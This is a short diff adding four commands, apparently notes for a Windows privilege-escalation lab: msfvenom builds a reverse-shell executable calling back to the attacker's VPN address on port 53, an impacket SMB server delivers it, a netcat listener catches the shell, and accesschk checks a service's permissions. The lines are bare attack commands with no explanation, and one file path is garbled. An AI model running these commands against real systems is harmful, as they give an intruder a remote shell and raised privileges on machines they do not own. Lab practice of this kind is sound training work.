@@ -1,0 +1,4 @@
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(vpn-ip) LPORT=53 -f exe -o reverse.exe
+sudo impacket-smbserver kali .
+sudo nc -nlvp 53
+C:\PrivEscccesschk.exe /accepteula -uwcqv user daclsvc
